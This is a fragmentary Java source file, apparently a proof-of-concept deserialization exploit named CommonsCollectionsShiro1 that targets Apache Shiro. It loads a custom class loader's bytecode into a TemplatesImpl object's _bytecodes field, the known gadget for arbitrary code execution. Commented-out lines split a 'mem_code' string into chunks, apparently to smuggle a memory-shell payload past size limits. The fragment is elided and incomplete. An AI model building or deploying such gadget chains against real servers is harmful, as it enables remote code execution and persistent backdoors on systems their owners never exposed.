...
public class CommonsCollectionsShiro1 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(LClassLoader.class.getName()).toBytecode()
        });
...
//        for(int i = 0; i < len; i++){
//            if(1 == len-i){
//                mp[i] = mem_code.substring((mem_code.length() / len) * i, (mem_code.length() / len) * (i + 1)+1);
//            } else {
